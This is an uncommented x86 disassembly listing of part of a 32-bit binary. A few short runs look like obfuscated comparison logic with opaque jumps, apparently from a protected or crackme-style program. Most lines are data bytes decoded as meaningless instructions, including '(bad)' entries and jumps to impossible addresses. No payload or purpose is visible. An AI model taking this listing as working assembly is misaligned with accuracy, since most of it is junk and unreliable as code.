  40190c:	mov    ds:0xe627399c,al
  401911:	inc    ebx
  401912:	stos   DWORD PTR es:[edi],eax
  401913:	xchg   esp,eax
  401914:	rol    ch,cl
  401916:	push   ebp
  401917:	jg     0x4018a4
  401919:	cmp    DWORD PTR [ebp-0x6a4275af],edx
  40191f:	jno    0x4018a7
  401921:	cmc    
  401922:	push   ds
  401923:	mov    WORD PTR [ebx-0x42],cs
  401926:	test   DWORD PTR [ecx],ebp
  401928:	or     al,0x87
  40192a:	jmpw   0x758
  40192e:	jae    0x401989
  401930:	sbb    ebp,DWORD PTR [edi-0x450f97e3]
  401936:	into   
  401937:	and    eax,0xbfa59bae
  40193c:	push   ecx
  40193d:	push   cs
  40193e:	std    
  40193f:	add    BYTE PTR [ebx+eax*8],ch
  401942:	or     eax,0x73821bd2
  401947:	mov    eax,0x8dcb5584
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x717bf628
  401994:	jmp    0x7ab0c899
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	jae    0x4019b1
  4019a1:	push   eax
  4019a2:	push   ebp
  4019a3:	mov    ebp,0xc3f95860
  4019a8:	push   edx
  4019a9:	mov    dh,0xec
  4019ab:	xor    al,dl
  4019ad:	int    0xaa
  4019af:	push   esi
  4019b0:	repnz pop esp
  4019b2:	xchg   DWORD PTR [eax-0x4],ebp
  4019b5:	pop    edi
  4019b6:	or     DWORD PTR [esi+edi*4+0x7007a25e],edx
  4019bd:	cs sub eax,0xe7272640
  4019c3:	test   BYTE PTR [esi+edi*2-0x5f],0xba
  4019c8:	push   eax
  4019c9:	xchg   edi,eax
  4019ca:	adc    al,0x72
  4019cc:	fadd   st,st(0)
  4019ce:	(bad)  
  4019cf:	cmp    al,0x1b
  4019d1:	(bad)  
  4019d2:	daa    
  4019d3:	jle    0xcafa4d5e
  4019d9:	(bad)  
  4019db:	and    ebx,DWORD PTR [ebx-0x506b3c65]
  4019e1:	jp     0x401a33
  4019e3:	cwde   
  4019e4:	jb     0x4019e2
  4019e6:	cmp    ebp,edi
  4019e8:	lds    eax,FWORD PTR [ebx]
  4019ea:	push   ds
  4019eb:	and    BYTE PTR [ebx+0x2332ca88],0xfa
  4019f2:	mov    ebp,0x33d705e6
  4019f7:	mov    WORD PTR [edx+0x453719cc],?
  4019fd:	int3   
  4019fe:	lds    edi,FWORD PTR [ecx-0x69d5faab]
  401a04:	sbb    DWORD PTR [eax],ebx
  401a06:	stos   BYTE PTR es:[edi],al
  401a07:	push   edx
  401a08:	mov    dh,0xc9
  401a0a:	xchg   ebx,eax
  401a0b:	ret    
  401a0c:	pop    esp
  401a0d:	push   0xffffffb2
  401a0f:	mov    ds:0x29317766,eax
  401a14:	and    eax,0x7500669d
  401a19:	int    0xd2
  401a1b:	cs push 0x274b4913
  401a21:	daa    
  401a22:	imul   ebp,DWORD PTR fs:[eax+ecx*4-0x17732d10],0x1
  401a2b:	ins    BYTE PTR es:[edi],dx
  401a2c:	pop    eax
  401a2d:	xor    BYTE PTR [esi],dl
  401a2f:	daa    
  401a30:	pop    eax
  401a31:	mov    dh,al
  401a33:	or     BYTE PTR [edi],0x29
  401a36:	in     eax,0x39
  401a38:	push   ebx
  401a39:	add    dh,ch
  401a3b:	loopne 0x4019c5
  401a3d:	ret    0x4de2
  401a40:	cmp    bh,BYTE PTR [esi+0x229b6795]
  401a46:	imul   edi,DWORD PTR ds:0xc9243504,0xffffff97
  401a4d:	mov    esp,edi
  401a4f:	lods   al,BYTE PTR ds:[esi]
  401a50:	out    dx,eax
  401a51:	pop    ebp
  401a52:	inc    edx
  401a53:	add    eax,0x1db07bc9
  401a58:	and    ebp,ebp
  401a5a:	inc    edi
  401a5b:	aaa    
  401a5c:	jp     0x401ac3
  401a5e:	pop    ebx
  401a5f:	in     eax,0xa0
  401a61:	jmp    0x401a94
  401a63:	fbld   TBYTE PTR [edi+0x548a6fbf]
  401a69:	out    0x68,al
  401a6b:	out    dx,eax
  401a6c:	sub    cl,BYTE PTR [edx+eiz*4-0x9]
  401a70:	addr16 mov ds:0x865,eax
  401a74:	pop    ecx
  401a75:	(bad)  
  401a76:	aaa    
  401a77:	push   ds
  401a78:	mov    WORD PTR [ecx+0x7a],gs
  401a7b:	push   esi
  401a7c:	in     eax,dx
  401a7d:	ja     0x401a60
  401a7f:	(bad)
  401a82:	call   0xb06cc147
  401a87:	xor    eax,DWORD PTR [edx+0x46]
  401a8a:	jb     0x401a38
  401a8c:	cmp    eax,0x83489a55
  401a91:	pop    ebp
  401a92:	cs iret 
  401a94:	into   
  401a95:	aaa    
  401a96:	outs   dx,DWORD PTR ds:[esi]
  401a97:	out    0x8b,eax
  401a99:	stos   DWORD PTR es:[edi],eax
  401a9a:	dec    eax
  401a9b:	jmp    0xe45a:0x726de381
  401aa2:	inc    esi
  401aa3:	jno    0x401a9f
  401aa5:	repnz sbb ch,BYTE PTR [ebp+0x6c]
  401aa9:	test   BYTE PTR [eax],bh
  401aab:	fdiv   st,st(4)
  401aad:	sbb    DWORD PTR [eax],ebx
  401aaf:	fld    TBYTE PTR [ecx+edx*1+0x5d8c5183]
  401ab6:	mov    dh,0x69
  401ab8:	dec    ecx
  401ab9:	xor    eax,0xabe31a2d
  401abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401abf:	and    dh,dh
  401ac1:	mov    BYTE PTR [eax+0x4e],al
  401ac4:	and    edi,ecx
  401ac6:	add    BYTE PTR [esi+0x56],0x1
  401aca:	mov    cl,0xdd
  401acc:	sbb    bl,BYTE PTR [ebx-0x1f]
  401acf:	inc    edx
  401ad0:	les    ecx,FWORD PTR es:[esi+0x3a]
  401ad4:	sub    BYTE PTR [edi],cl
  401ad6:	test   BYTE PTR [edx],ch
  401ad8:	jmp    0x16f5f99c
  401add:	push   0xffffffcb
  401adf:	and    eax,0xf78118e4
  401ae4:	jno    0xc0fd77fa
  401aea:	bound  ebp,QWORD PTR [esp+ebp*8+0x24781ab0]
  401af1:	pop    edi
  401af2:	loope  0x401ad7
  401af4:	ins    DWORD PTR es:[di],dx
  401af6:	adc    DWORD PTR [esp+ecx*2+0x1b],esp
  401afa:	pusha  
  401afb:	test   BYTE PTR [esi+0x65e4660d],dl
  401b01:	out    dx,al
  401b02:	les    esp,FWORD PTR [edi+0x716df906]
  401b08:	es scas eax,DWORD PTR es:[edi]
  401b0a:	xchg   edi,eax
  401b0b:	dec    eax
  401b0c:	jge    0x401ad4
  401b0e:	shl    DWORD PTR [ebx+esi*8+0x41],0x3e
  401b13:	add    al,0x70
  401b15:	lods   al,BYTE PTR ds:[esi]
  401b16:	cwde   
  401b17:	mov    al,0x21
  401b19:	pop    ebp
  401b1a:	retf   0x541d
  401b1d:	int    0xb4
  401b1f:	ret    
  401b20:	div    DWORD PTR [ecx-0x55565a6a]
  401b26:	retf   0xbd58
  401b29:	adc    DWORD PTR [eax+esi*2+0x79],ebp
  401b2d:	xchg   esp,eax
  401b2e:	mov    cl,0xc1
  401b30:	sbb    bh,ch
  401b32:	icebp  
  401b33:	and    ecx,0x731f898d
  401b39:	popf   
  401b3a:	cdq    
  401b3b:	ret    0xf59
  401b3e:	rol    DWORD PTR [edx],1
  401b40:	push   ebx
  401b41:	in     al,dx
  401b42:	sti    
  401b43:	sbb    eax,DWORD PTR [ebx*8+0x4c67ecab]
  401b4a:	aam    0x93
  401b4c:	repnz cmp eax,0xcfd2cd53
  401b52:	pop    ebx
  401b53:	fild   DWORD PTR [ebp-0x41]
  401b56:	stos   BYTE PTR es:[edi],al
  401b57:	in     al,0xe5
  401b59:	inc    eax
  401b5a:	mov    ds:0x81657aad,al
  401b5f:	xor    BYTE PTR [esi],ah
  401b61:	mov    bh,0x5c
  401b63:	shl    ebx,0x1f
  401b66:	dec    eax
  401b67:	outs   dx,BYTE PTR ds:[esi]
  401b68:	out    dx,eax
  401b69:	mov    ds:0x2a197da4,al
  401b6e:	loope  0x401b98
  401b70:	add    DWORD PTR [edx],esp
  401b72:	cmp    DWORD PTR [ecx-0x29],ebp
  401b75:	adc    al,0x7f
  401b77:	loop   0x401b0b
  401b79:	xchg   esp,eax
  401b7a:	dec    esi
  401b7b:	pop    ecx
  401b7c:	lds    edi,FWORD PTR [ebx+0x53]
  401b7f:	scas   eax,DWORD PTR es:[edi]
  401b80:	pushf  
  401b81:	mov    fs,edi
  401b83:	popa   
  401b84:	adc    eax,0x5e6fc775
  401b89:	mov    WORD PTR [edx-0x71],fs
  401b8c:	push   ss
  401b8d:	xor    ch,bl
  401b8f:	ss push ebx
  401b91:	mov    eax,0x327980
  401b96:	xchg   esp,eax
  401b97:	jl     0x401c0e
  401b99:	rol    BYTE PTR [esi-0x3e4ca87b],cl
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    al,cl
  401bdd:	mov    esi,0x78704e23
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401be9:	push   edx
  401bea:	adc    DWORD PTR [ebp-0x20d44328],ebp
  401bf0:	neg    edi
  401bf2:	jbe    0x401c1f
  401bf4:	mov    ebx,0x74450192
  401bf9:	mov    edi,0x29e6808e
  401bfe:	or     esi,DWORD PTR [esi+0x67957e91]
  401c04:	enter  0x4315,0x38
  401c08:	adc    al,0x2c
  401c0a:	pop    edx
  401c0b:	sub    BYTE PTR [eax-0x39],cl
  401c0e:	inc    ebx
  401c0f:	pop    esi
  401c10:	push   0xfffffff0
  401c12:	jns    0x401ba2
  401c14:	mov    ds:0xecdad4d,al
  401c19:	push   edx
  401c1a:	xchg   edi,eax
  401c1b:	xchg   ecx,eax
  401c1c:	popf   
  401c1d:	xchg   ebp,eax
  401c1e:	adc    cl,BYTE PTR cs:[ecx+0x11502927]
  401c25:	cmc    
  401c26:	pop    ecx
  401c27:	mov    WORD PTR [ecx+0x37],ss
  401c2a:	ins    DWORD PTR es:[edi],dx
  401c2b:	xchg   BYTE PTR [eax-0x3184faee],dl
  401c31:	aaa    
  401c32:	push   ebp
  401c33:	inc    esp
  401c34:	xor    edx,edi
  401c36:	dec    ebx
  401c37:	mov    esp,0xb6f1146a
  401c3c:	je     0x401bf0
  401c3e:	out    0x58,al
  401c40:	adc    DWORD PTR [ecx],0x832977b
  401c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c47:	push   0x30
  401c49:	xchg   edx,eax
  401c4a:	mov    ss,ebx
  401c4c:	lock stc 
  401c4e:	push   ebp
  401c4f:	out    0x27,al
  401c51:	mov    ah,0x1d
  401c53:	out    dx,al
  401c54:	sbb    DWORD PTR [eax-0x4b86dbdb],edi
  401c5a:	test   BYTE PTR [ebx-0x23554ec],0x15
  401c61:	les    ebp,FWORD PTR [ecx-0x20]
  401c64:	loop   0x401c86
  401c66:	iret   
  401c67:	mov    DWORD PTR [eax+edi*2],0x8d430586
  401c6e:	mov    ecx,0x5025e2a4
  401c73:	dec    ebp
  401c74:	xor    al,0x99
  401c76:	stos   BYTE PTR es:[edi],al
  401c77:	fucomip st,st(4)
  401c79:	xlat   BYTE PTR ds:[ebx]
  401c7a:	cwde   
  401c7b:	outs   dx,BYTE PTR es:[esi]
  401c7d:	loope  0x401c11
  401c7f:	xchg   DWORD PTR [edx+ebp*4+0x75],esp
  401c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c84:	out    dx,al
  401c85:	push   ss
  401c86:	or     esp,DWORD PTR [ebp+0x11]
  401c89:	sbb    BYTE PTR [eax-0x41],al
  401c8c:	pop    esp
  401c8d:	mov    edx,0xef92b8ec
  401c92:	pop    ds
  401c93:	ins    BYTE PTR es:[edi],dx
  401c94:	inc    ecx
  401c95:	fisubr WORD PTR [edi+ecx*2-0x408fa469]
  401c9c:	dec    esi
  401c9d:	dec    esp
  401c9e:	add    dl,BYTE PTR [ebx]
  401ca0:	cmp    bl,BYTE PTR ds:0x54a37011
  401ca6:	pop    ecx
  401ca7:	sbb    DWORD PTR [ebp+0x73],ebx
  401caa:	mov    WORD PTR [ebp+0xa],ds
  401cad:	inc    esi
  401cae:	jge    0x401c8b
  401cb0:	jnp    0x401d19
  401cb2:	in     eax,0x25
  401cb4:	loope  0x401d32
  401cb6:	mov    BYTE PTR [edx+0x5babbfa],cl
  401cbc:	dec    edi
  401cbd:	mov    al,ds:0x128ecd1b
  401cc2:	(bad)  
  401cc3:	sbb    dl,BYTE PTR [esi+0x40]
  401cc6:	jle    0x401cd9
  401cc8:	mov    DWORD PTR [ebx-0x45],ecx
  401ccb:	mov    ah,0x17
  401ccd:	dec    ecx
  401cce:	pop    ss
  401ccf:	xor    BYTE PTR [eax+0x60],dl
  401cd2:	cmp    DWORD PTR [ecx+ebp*4-0x79],edi
  401cd6:	push   ds
  401cd7:	push   0x164783c4
  401cdc:	ficom  DWORD PTR [ebx-0xc]
  401cdf:	nop
  401ce0:	pop    ebp
  401ce1:	aam    0x8a
  401ce3:	inc    ecx
  401ce4:	jle    0x401d4c
  401ce6:	das    
  401ce7:	ja     0x401d3c
  401ce9:	sti    
  401cea:	arpl   dx,ax
  401cec:	lock jae 0x401cfd
  401cef:	push   ebx
  401cf0:	jge    0x401d39
  401cf2:	adc    ebp,edx
  401cf4:	pop    eax
  401cf5:	pop    ebp
  401cf6:	mov    dl,0xdf
  401cf8:	lock mov edx,0x74f43574
  401cfe:	pop    edx
  401cff:	cli    
  401d00:	mov    edx,0x6a981075
  401d05:	mov    ds:0x3460a27c,al
  401d0a:	jne    0x401c8d
  401d0c:	jmp    0xc5f612ce
  401d11:	pop    ecx
  401d12:	(bad)  [edx+0x5fdec915]
  401d18:	(bad)  
  401d19:	sbb    BYTE PTR [ebx],bl
  401d1b:	pop    es
  401d1c:	pop    es
  401d1d:	das    
  401d1e:	cli    
  401d1f:	cmp    al,BYTE PTR [ecx-0x39094a89]
  401d25:	or     al,0x3e
  401d27:	and    al,dh
  401d29:	mov    dl,0xba
  401d2b:	or     eax,0x7a30243a
  401d30:	in     eax,0xbf
  401d32:	jb     0x401cf5
  401d34:	sbb    BYTE PTR [esi+0x53],0x58
  401d38:	mov    edx,0xb5c29e58
  401d3d:	popf   
  401d3e:	pop    ebp
  401d3f:	sub    BYTE PTR [edi],bl
  401d41:	sub    DWORD PTR [eax-0x5759a43c],ebx
  401d47:	mov    ebp,DWORD PTR [edi+edi*2]
  401d4a:	cld    
  401d4b:	and    BYTE PTR ds:0x3ee26f97,bl
  401d51:	cmc    
  401d52:	mov    al,0xd3
  401d54:	repnz arpl WORD PTR [edx*2+0x6e69461],bp
  401d5c:	(bad)  
  401d5d:	stos   BYTE PTR es:[edi],al
  401d5e:	jge    0x401db1
  401d60:	out    0x24,al
  401d62:	cwde   
  401d63:	dec    edx
  401d64:	je     0x401de4
  401d66:	xchg   DWORD PTR [edi],eax
  401d68:	cmp    eax,0xacc8180c
  401d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d6e:	mov    ebx,DWORD PTR [ecx+0x6aa13812]
  401d74:	sar    edx,1
  401d76:	ret    0x6898
  401d79:	lahf   
  401d7a:	in     al,dx
  401d7b:	popa   
  401d7c:	jmp    0x401dfa
  401d7e:	dec    edx
  401d7f:	ds es inc eax
  401d82:	or     ecx,ebp
  401d84:	jmp    FWORD PTR [eax+0x44]
  401d87:	inc    edi
  401d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d89:	aad    0xfd
  401d8b:	sbb    al,0x9f
  401d8d:	adc    BYTE PTR [edi-0x5b],dh
  401d90:	add    BYTE PTR [esi],dl
  401d92:	mov    ebp,0x45fad32b
  401d97:	jno    0x401df1
  401d99:	sbb    BYTE PTR [ecx+0x63],ah
  401d9c:	imul   esi,DWORD PTR [esi+0x666f2401],0x5
  401da3:	pop    edi
  401da4:	inc    esp
  401da5:	and    DWORD PTR [eax-0x341c51be],ecx
  401dab:	and    al,BYTE PTR [ebp+0x65]
  401dae:	das    
  401daf:	cwde   
  401db0:	rol    BYTE PTR [ebx-0x41],cl
  401db3:	xor    BYTE PTR [edx+0x2b],ch
  401db6:	into   
  401db7:	cld    
  401db8:	pop    ebp
  401db9:	jmp    0x779e9d06
  401dbe:	jg     0x401d49
  401dc0:	das    
  401dc1:	fisubr DWORD PTR [edi]
  401dc3:	out    0x2,al
  401dc5:	fldenv [ebx-0x55]
  401dc8:	jg     0x247b1c39
  401dce:	add    esp,DWORD PTR [esi]
  401dd0:	xor    DWORD PTR [ecx-0x40],eax
  401dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dd4:	mov    BYTE PTR [esi+0x30],al
  401dd7:	add    al,0xc4
  401dd9:	mov    ds:0xda74511e,al
  401dde:	imul   eax,DWORD PTR [esi],0x2b
  401de1:	(bad)  
  401de2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401de4:	rol    DWORD PTR [ebx+0x4503981d],1
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ebx+ecx*8+0x7],dl
  401e44:	and    al,0x7c
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	imul   ecx,ecx,0x38
  401e51:	push   0xffffff93
  401e53:	jns    0x401e63
  401e55:	pop    ss
  401e56:	int    0x97
  401e58:	pop    eax
  401e59:	push   ecx
  401e5a:	jp     0x401e15
  401e5c:	xchg   ecx,eax
  401e5d:	cmp    al,0x4b
  401e5f:	xchg   bl,cl
  401e61:	dec    edx
  401e62:	icebp  
  401e63:	dec    esi
  401e64:	push   ds
  401e65:	js     0x401e14
  401e67:	outs   dx,DWORD PTR ds:[esi]
  401e68:	test   BYTE PTR [eax],bh
  401e6a:	mov    esp,0xfec2ce5e
  401e6f:	ficomp DWORD PTR [ebp-0x5c]
  401e72:	pop    eax
  401e73:	dec    ebp
  401e74:	ds test eax,0xb65c3e1e
  401e7a:	sub    al,0x7b
  401e7c:	dec    ecx
  401e7d:	(bad)  
  401e7e:	stos   DWORD PTR es:[edi],eax
  401e7f:	xchg   ecx,eax
  401e80:	add    al,0xd9
  401e82:	nop
  401e83:	not    DWORD PTR [ebp+0x5d]
  401e86:	arpl   cx,bx
  401e88:	js     0x401eb3
  401e8a:	mov    ebx,0x44b96db1
  401e8f:	in     al,0xd0
  401e91:	ror    BYTE PTR [ecx+0x2ad8d50b],cl
  401e97:	cmp    DWORD PTR [ecx],edi
  401e99:	adc    DWORD PTR [esi-0x50],edi
  401e9c:	dec    edx
  401e9d:	ins    BYTE PTR es:[edi],dx
  401e9e:	mov    DWORD PTR [eax+0x33e0cf16],edi
  401ea4:	lock mov WORD PTR [ecx+ebx*4],fs
  401ea8:	ja     0x401edb
  401eaa:	fisubr WORD PTR [esi]
  401eac:	pop    edx
  401ead:	sub    eax,0xeddde61d
  401eb2:	pop    edi
  401eb3:	push   ecx
  401eb4:	fst    DWORD PTR [edi+ebx*4-0xb5a84b]
  401ebb:	cli    
  401ebc:	mov    edx,0xdfa53efd
  401ec1:	sub    eax,0x3cafa2af
  401ec6:	inc    edx
  401ec7:	sbb    esp,ebx
  401ec9:	adc    eax,0xd28b0a99
  401ece:	pop    ss
  401ecf:	scas   al,BYTE PTR es:[edi]
  401ed0:	rcl    DWORD PTR [ebx],0x54
  401ed3:	pop    ss
  401ed4:	push   ss
  401ed5:	mov    ebp,0xf5db9fb9
  401eda:	jne    0x401ef6
  401edc:	adc    DWORD PTR [ecx-0x77],ecx
  401edf:	lods   eax,DWORD PTR ds:[esi]
  401ee0:	xchg   esi,eax
  401ee1:	ss pop ss
  401ee3:	lock imul ebp,eax,0xafe85def
  401eea:	popf   
  401eeb:	cmp    DWORD PTR [edi+0x19],eax
  401eee:	repnz and edi,DWORD PTR ds:0x660b8c0a
  401ef5:	mov    bh,0xd2
  401ef7:	das    
  401ef8:	stos   BYTE PTR es:[edi],al
  401ef9:	and    eax,0x767d7b67
  401efe:	rol    DWORD PTR [eax],1
  401f00:	mov    bl,0xb6
  401f02:	mov    ch,0x69
  401f04:	shl    DWORD PTR [eax+0x5d],cl
  401f07:	sbb    eax,0xf63cf74f
  401f0c:	inc    edi
  401f0d:	sbb    DWORD PTR [esi+0x27],esi
  401f10:	xor    BYTE PTR [ecx+eax*8+0x20540663],cl
  401f17:	push   0xb40d9e0f
  401f1c:	popf   
  401f1d:	mov    ch,0xc
  401f1f:	inc    ebx
  401f20:	in     al,dx
  401f21:	lods   al,BYTE PTR ds:[esi]
  401f22:	je     0x401f87
  401f24:	fcomp  QWORD PTR [eax]
  401f26:	mov    ah,0x6f
  401f28:	dec    ebx
  401f29:	das    
  401f2a:	xor    BYTE PTR [ebx+0x6de47cd7],cl
  401f30:	std    
  401f31:	ja     0x401f04
  401f33:	lods   al,BYTE PTR ds:[esi]
  401f34:	in     eax,0xf4
  401f36:	add    ebx,ebx
  401f38:	jb     0xc4e1a175
  401f3e:	lahf   
  401f3f:	fidivr DWORD PTR [edi]
  401f41:	cmp    eax,0xac7835a
  401f46:	loop   0x401f4d
  401f48:	in     al,dx
  401f49:	sub    eax,0x94bc8075
  401f4e:	stc    
  401f4f:	xchg   edx,eax
  401f50:	mov    BYTE PTR [edx-0x3a],ch
  401f53:	push   ds
  401f54:	mov    ds:0xc2b321f8,al
  401f59:	xchg   edi,eax
  401f5a:	jle    0x401fa2
  401f5c:	lods   al,BYTE PTR ds:[esi]
  401f5d:	mov    bh,0xa9
  401f5f:	cs leave 
  401f61:	loope  0x401fc9
  401f63:	mov    ?,eax
  401f65:	jmp    0x98a2:0xf00e43ff
  401f6c:	and    eax,0xfa797bba
  401f71:	adc    al,0x9b
  401f73:	fcomi  st,st(2)
  401f75:	xchg   ebx,eax
  401f76:	daa    
  401f77:	nop
  401f78:	cmp    ch,dl
  401f7a:	imul   esp,esi,0xe38de78b
  401f80:	fwait
  401f81:	addr16 icebp 
  401f83:	cmp    al,ah
  401f85:	xchg   ecx,eax
  401f86:	mov    esp,0xa36aa48b
  401f8b:	jle    0x401f74
  401f8d:	xor    DWORD PTR [ebx-0x77],eax
  401f90:	sub    eax,0x219dd7d2
  401f95:	dec    esi
  401f96:	dec    ebp
  401f97:	sahf   
  401f98:	shr    BYTE PTR [eax+0xa],1
  401f9b:	adc    BYTE PTR [esi+0x6b],al
  401f9e:	sahf   
  401f9f:	out    dx,eax
  401fa0:	push   edx
  401fa1:	and    ah,al
  401fa3:	and    al,0x78
  401fa5:	shl    DWORD PTR [eax+0x6e130128],1
  401fab:	and    edx,DWORD PTR [ebp+0x55a5d29f]
  401fb1:	push   es
  401fb2:	(bad)
  401fb6:	imul   esi,DWORD PTR [esi+ecx*2-0x778b8b59],0xe9fb41cc
  401fc1:	add    al,0x77
  401fc3:	nop
  401fc4:	out    dx,al
  401fc5:	and    eax,0xb4dcab02
  401fca:	mov    esp,0xa9e686b9
  401fcf:	bnd jp 0x401f81
  401fd2:	inc    ecx
  401fd3:	jbe    0x402025
  401fd5:	aas    
  401fd6:	xor    ebp,DWORD PTR [edi+0x414007a3]
  401fdc:	sbb    bl,BYTE PTR [edi]
  401fde:	cli    
  401fdf:	enter  0x650a,0x92
  401fe3:	fcomi  st,st(5)
  401fe5:	adc    al,0xc2
  401fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fe8:	sbb    eax,0x639f1cf8
  401fed:	hlt    
  401fee:	fdivr  DWORD PTR [ecx+0x6e]
  401ff1:	int3   
  401ff2:	cmp    ch,BYTE PTR [ebp+0x3b2ad470]
  401ff8:	sbb    DWORD PTR [eax-0x59641fcc],edx
  401ffe:	pop    es
  401fff:	pop    ecx
  402000:	mov    al,BYTE PTR [edi+0x1449d8d7]
  402006:	std    
  402007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402008:	and    DWORD PTR [ebp-0x11],eax
  40200b:	dec    ecx
  40200c:	dec    ebx
  40200d:	repz xchg ecx,eax
  40200f:	fstp   DWORD PTR [eax+0x7a1b66e9]
  402015:	fwait
  402016:	mov    cl,0xde
  402018:	cld    
  402019:	mov    bh,0x90
  40201b:	leave  
  40201c:	adc    esp,DWORD PTR [ebx]
  40201e:	loopne 0x401fef
  402020:	jl     0x402017
  402022:	ds push esi
  402024:	jle    0x402009
  402026:	(bad)  
  402027:	adc    ch,bl
  402029:	cdq    
  40202a:	fwait
  40202b:	pop    ss
  40202c:	adc    ebx,DWORD PTR [ecx-0x2c]
  40202f:	or     edx,ebx
  402031:	aaa    
  402032:	fild   WORD PTR [ebx]
  402034:	lods   eax,DWORD PTR ds:[esi]
  402035:	ins    BYTE PTR es:[edi],dx
  402036:	cmc    
  402037:	jmp    0x401fdf
  402039:	jp     0x402029
  40203b:	inc    ebp
  40203c:	sti    
  40203d:	es or  dh,bh
  402040:	and    eax,0x96a62d50
  402045:	in     al,dx
  402046:	mov    bh,0x3e
  402048:	ret    
  402049:	sub    edx,esi
  40204b:	xchg   esp,eax
  40204c:	inc    edx
  40204d:	and    cl,BYTE PTR [ebx+0x128bd855]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	cmp    BYTE PTR [eax],0x7e
  40206c:	imul   esi,DWORD PTR [edi+0x70700470],0x70707e70
  402076:	std    
  402077:	inc    esp
  402078:	adc    DWORD PTR [eax+eiz*4+0x6e],esi
  40207c:	and    BYTE PTR [esi],dl
  40207e:	call   0x426a:0x21ea7e4d
  402085:	stos   BYTE PTR es:[edi],al
  402086:	sub    DWORD PTR [ebx+0x40],ebp
  402089:	cmc    
  40208a:	aaa    
  40208b:	aad    0x95
  40208d:	jo     0x4020e6
  40208f:	sub    BYTE PTR [ecx+0x75acd307],cl
  402095:	sbb    al,0x5
  402097:	(bad)  
  402098:	mul    edi
  40209a:	(bad)  [ebp-0x3f]
  40209d:	fcomp  st(4)
  40209f:	mov    eax,0x9b306b85
  4020a4:	scas   eax,DWORD PTR es:[edi]
  4020a5:	and    DWORD PTR [esi-0x3c],ebx
  4020a8:	aam    0x9b
  4020aa:	pop    esi
  4020ab:	mov    eax,0x17958652
  4020b0:	stos   DWORD PTR es:[edi],eax
  4020b1:	iret   
  4020b2:	aaa    
  4020b3:	mov    al,ds:0xb6529d1
  4020b8:	sbb    esi,0xffffff8c
  4020bb:	dec    esi
  4020bc:	pop    ds
  4020bd:	mov    dh,0xdb
  4020bf:	std    
  4020c0:	mov    bh,BYTE PTR [ecx]
  4020c2:	ja     0x4020c4
  4020c4:	imul   BYTE PTR [edi]
  4020c6:	dec    ebx
  4020c7:	(bad)  
  4020c8:	fidiv  WORD PTR [edi]
  4020ca:	cmp    ebp,DWORD PTR [esi+0x10]
  4020cd:	mov    ds:0xc486ac4e,al
  4020d2:	test   al,0xc
  4020d4:	fst    DWORD PTR [edi+edx*2-0x1b15b388]
  4020db:	dec    ebp
  4020dc:	and    DWORD PTR [eax*4+0x65a6789],eax
